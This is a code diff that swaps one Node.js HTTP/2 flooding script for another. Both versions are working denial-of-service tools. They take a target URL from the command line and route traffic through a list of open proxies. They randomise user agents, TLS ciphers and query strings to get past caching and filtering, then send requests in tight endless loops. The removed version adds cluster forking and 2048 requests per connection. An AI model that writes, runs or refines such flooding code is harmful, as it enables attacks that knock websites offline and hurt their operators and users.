@@ -1,159 +1,141 @@
+const { exec } = require('child_process');
+require('events').EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
 
-// xD ~NguyenDangTrinh
+const fs = require('fs');
+const url = require('url');
+const http = require('http');
+const tls = require('tls');
+const crypto = require('crypto');
+const http2 = require('http2');
+const fakeua = require('fake-useragent');
+tls.DEFAULT_ECDH_CURVE;
 
-const url = require('url'),
-fs = require('fs'),
-http2 = require('http2'),
-http = require('http'),
-tls = require('tls'),
-net = require('net'),
-cluster = require('cluster'),
-fakeua = require('fake-useragent'),
-cplist = [
-    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
-    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
-    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
-    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
-    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
-    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
-],
-accept_header = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
-],
-lang_header = [
-    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-    'en-US,en;q=0.5',
-    'en-US,en;q=0.9',
-    'de-CH;q=0.7',
-    'da, en-gb;q=0.8, en;q=0.7',
-    'cs;q=0.5'
-],
-encoding_header = [
-    'deflate, gzip;q=1.0, *;q=0.5',
-    'gzip, deflate, br',
-    '*'
-],
-control_header = [
-    'no-cache',
-    'no-store',
-    'no-transform',
-    'only-if-cached',
-    'max-age=0'
-],
-ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
-ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
-process.on('uncaughtException', function (e) {
-if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-    //console.warn(e);
-}).on('unhandledRejection', function (e) {
-if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-    //console.warn(e);
-}).on('warning', e => {
-if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-    //console.warn(e);
-}).setMaxListeners(0);
-function accept() {
-    return accept_header[Math.floor(Math.random() * accept_header.length)];
-}
+let payload = {};
 
-function lang() {
-    return lang_header[Math.floor(Math.random() * lang_header.length)];
-}
+var proxies = fs.readFileSync('utils/http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
+var objetive = process.argv[2];
+var parsed = url.parse(objetive);
+const sigalgs = [
+    'ecdsa_secp256r1_sha256',
+    'ecdsa_secp384r1_sha384',
+    'ecdsa_secp521r1_sha512',
+    'rsa_pss_rsae_sha256',
+    'rsa_pss_rsae_sha384',
+    'rsa_pss_rsae_sha512',
+    'rsa_pkcs1_sha256',
+    'rsa_pkcs1_sha384',
+    'rsa_pkcs1_sha512',
+];
+let SignalsList = sigalgs.join(':');
 
-function encoding() {
-    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
-}
-
-function controling() {
-    return control_header[Math.floor(Math.random() * control_header.length)];
-}
-
-function cipher() {
-    return cplist[Math.floor(Math.random() * cplist.length)];
-}
-
-proxys = fs.readFileSync("proxy.txt", 'utf-8').toString().match(/\S+/g);
-function proxyr() {
-    return proxys[Math.floor(Math.random() * proxys.length)];
-}
-if(cluster.isMaster) {
-const dateObj = new Date();
-    for(var bb=0;bb<process.argv[4];bb++) {
-        cluster.fork();
+class TlsBuilder {
+    constructor(socket) {
+        this.curve = "GREASE:X25519:x25519";
+        this.sigalgs = SignalsList;
+        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
     }
-    setTimeout(() => {
-        process.exit(-1)
-    }, process.argv[3] * 1000)
-}else {
-    function flood() {
-        var parsed = url.parse(process.argv[2]);
+    http2TUNNEL(socket) {
         const uas = fakeua();
-        var cipper = cipher()
-        var proxy = proxyr().split(':')
-        var header = {
-            ":path": parsed.path,
-            "X-Forwarded-For": proxy[0],
-            "X-Forwarded-Host": proxy[0], 
-            ":method": "GET",
-            "User-agent": uas,
-            "Origin": process.argv[2],
-            "Accept": accept(),
-            "Accept-Encoding": encoding(),
-            "Accept-Language": lang(),
-            "Cache-Control": controling(),
-        }
-        const agent = new http.Agent({
-            keepAlive: true,
-            keepAliveMsecs: 10000,
-            maxSockets: 65535,
+        socket.setKeepAlive(true, 1000);
+        socket.setTimeout(10000);
+        payload[":method"] = "GET";
+        payload["Referer"] = objetive;
+        payload["User-agent"] = uas,
+            payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
+        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
+        payload['client-control'] = 'max-age=43200, s-max-age=43200';
+        payload['Upgrade-Insecure-Requests'] = 1;
+        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
+        payload['Accept-Encoding'] = 'gzip, deflate, br';
+        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1';
+        payload[":path"] = parsed.path + "?" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        const tunnel = http2.connect(parsed.href, {
+            createConnection: () => tls.connect({
+                socket: socket,
+                ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256" + ":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:" + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+                host: parsed.host,
+                servername: parsed.host,
+                secure: true,
+                honorCipherOrder: true,
+                requestCert: true,
+                secureOptions: this.Opt,
+                sigalgs: this.sigalgs,
+                rejectUnauthorized: false,
+                ALPNProtocols: ['h2'],
+            }, () => {
+
+                for (let i = 0; i < 120; i++) {
+
+                    setInterval(async () => {
+                        await tunnel.request(payload).close()
+                    });
+                }
+            })
         });
-        var req = http.request({
+    }
+}
+
+BuildTLS = new TlsBuilder();
+const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });
+
+function checkProxy(proxy) {
+    return new Promise((resolve, reject) => {
+        proxy = proxy.split(':');
+        var req = http.get({
             host: proxy[0],
-            agent: agent,
-            globalAgent: agent,
             port: proxy[1],
-            headers: {
-                'Host': parsed.host,
-                'Proxy-Connection': 'Keep-Alive',
-                'Connection': 'Keep-Alive',
-            },
-            method: 'CONNECT',
-            path: parsed.host+':443'
-        }, function(){ 
-            req.setSocketKeepAlive(true);
-        });
-        req.on('connect', function (res, socket, head) { 
-            const client = http2.connect(parsed.href, {
-                createConnection: () => tls.connect({
-                    host: parsed.host,
-                    ciphers: cipper, 
-                    secureProtocol: 'TLS_method',
-                    TLS_MAX_VERSION: '1.2',
-                    servername: parsed.host,
-                    secure: true,
-                    rejectUnauthorized: false,
-                    ALPNProtocols: ['h2'],
-                    socket: socket
-                }, function () {
-                    for (let i = 0; i< 2048; i++){
-                        const req = client.request(header);
-                        req.setEncoding('utf8');
-                        req.on('data', (chunk) => {
-                            // data += chunk;
-                        });
-                        req.on("response", () => {
-                            req.close();
-                        })
-                        req.end();
-                    }
-                })
-            });
+            timeout: 10000,
+            method: "CONNECT",
+            agent: keepAliveAgent,
+            path: parsed.host + ":443"
         });
         req.end();
+        req.on('connect', (_, socket) => {
+            // If connected successfully, resolve with the proxy
+            resolve(socket);
+            req.close();
+        });
+        req.on('error', (err) => {
+            // If error occurs during connection, reject with the error
+            reject(err);
+            req.close();
+        });
+    });
+}
+
+async function Runner() {
+    for (let i = 0; i < 100; i++) {
+        let proxy;
+        do {
+            proxy = proxies[Math.floor(Math.random() * proxies.length)];
+        } while (!(await checkProxy(proxy)));
+        
+        proxy = proxy.split(':');
+        var req = http.get({
+            host: proxy[0],
+            port: proxy[1],
+            timeout: 10000,
+            method: "CONNECT",
+            agent: keepAliveAgent,
+            path: parsed.host + ":443"
+        });
+        req.end();
+        req.on('connect', (_, socket) => {
+            BuildTLS.http2TUNNEL(socket);
+        });
+        req.on('end', () => {
+            req.resume()
+            req.close();
+        });
     }
-    setInterval(() => { flood() })
-  }
+}
+
+setInterval(Runner);
+
+setTimeout(function () {
+    process.exit();
+}, process.argv[3] * 100000);
+
+process.on('uncaughtException', function (er) {});
+process.on('unhandledRejection', function (er) {});
